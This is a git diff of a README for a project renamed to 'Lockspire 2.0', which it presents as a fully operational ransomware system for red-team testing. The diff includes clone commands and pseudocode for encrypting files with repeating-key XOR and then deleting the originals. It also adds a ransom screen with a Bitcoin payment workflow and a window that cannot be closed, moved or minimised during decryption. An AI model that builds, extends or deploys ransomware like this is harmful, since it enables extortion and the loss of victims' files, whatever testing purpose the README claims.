@@ -1,4 +1,4 @@
-# Ultimate Recovery Suite 
+# Lockspire 2.0
 
 ![Red Team](https://img.shields.io/badge/OPERATION-URS-critical)
 ![Ransomware](https://img.shields.io/badge/TYPE-RANSOMWARE-red)
@@ -6,7 +6,7 @@
 
 ## 🎯 MISSION BRIEF
 
-**Ultimate Recovery Suite** is a fully operational ransomware system designed for authorized penetration testing and red team operations. This implementation provides complete file encryption, professional GUI interface, and realistic payment demand simulation matching real-world ransomware campaigns.
+**Lockspire 2.0** is a fully operational ransomware system designed for authorized penetration testing and red team operations. This implementation provides complete file encryption, professional GUI interface, and realistic payment demand simulation matching real-world ransomware campaigns.
 
 ### ⚠️ OPERATIONAL PROTOCOLS
 
@@ -44,8 +44,8 @@
 
 ```bash
 # 1. Clone operational repository
-git clone https://github.com/AndreaCavanna/ultimate-recovery-suite
-cd ultimate-recovery-suite
+git clone https://github.com/AndreaCavanna/lockspire
+cd lockspire
 
 # 2. Create isolated test environment (MANDATORY)
 mkdir test_victim_folder
@@ -87,6 +87,8 @@ Execution Flow:
 - Professional GUI Interface: 3-panel ransom demand screen
 - System Fingerprinting: Unique System ID generation
 - Payment Simulation: Bitcoin address + recovery workflow
+- Anti-Tamper Lock: App CANNOT be closed during decryption - only after completion
+- Window Control: Immovable/non-minimizable window - Task Manager functional
 
 ## 🔧 TECHNICAL SPECIFICATIONS
 ```text
@@ -104,29 +106,24 @@ Execution Flow:
 ## File Encryption Pipeline
 
 ```
-# Production-grade encryption chain
+# Production-grade encryption chain (ESATTA)
 original_data = read_file("document.txt")
 b64_data = base64.b64encode(original_data)
-encrypted_chunks = []
-key = "SECRET_KEY_24_CHARACTERS_LONG"
-for i, byte in enumerate(b64_data):
-    key_byte = key[i % len(key)]
-    encrypted_byte = byte ^ ord(key_byte)
-    encrypted_chunks.append(encrypted_byte)
-header = b'ENC' + key.encode() + b':'
+key = "ROBLOX_035_UER_2000" → obfuscated_key (24 chars)
+encrypted_chunks = XOR(b64_data, repeating_key)
+header = b'ENC' + obfuscated_key.encode() + b':'
 encrypted_data = header + bytes(encrypted_chunks)
 final_encrypted = base64.b64encode(encrypted_data)
-write_file("document.txt.encrypted", final_encrypted)
+write_file("document.txt.lockspire", final_encrypted)
 delete_file("document.txt")
 ```
 
 ## File Decryption Pipeline
 
 ```
-# Catena decrittografia production-grade (ESATTA INVERSA)
-encrypted_data = base64.b64decode(read_file("document.txt.encrypted"))
-header = encrypted_data[:3]
-if header == b'ENC':
+# Exact inverse decryption chain (100% RECOVERABLE)
+encrypted_data = base64.b64decode(read_file("document.txt.lockspire"))
+if encrypted_data.startswith(b'ENC'):
     key_start = 3
     key_end = encrypted_data.find(b':', key_start)
     recovery_key = encrypted_data[key_start:key_end].decode()
@@ -141,9 +138,7 @@ if header == b'ENC':
     b64_decoded = bytes(decrypted_chunks)
     original_data = base64.b64decode(b64_decoded)
     write_file("document.txt", original_data)
-    delete_file("document.txt.encrypted")
-else:
-    print("❌ File non valido o corrotto")
+    delete_file("document.txt.lockspire")
 ```
 
 ## 📋 File Selection Rules
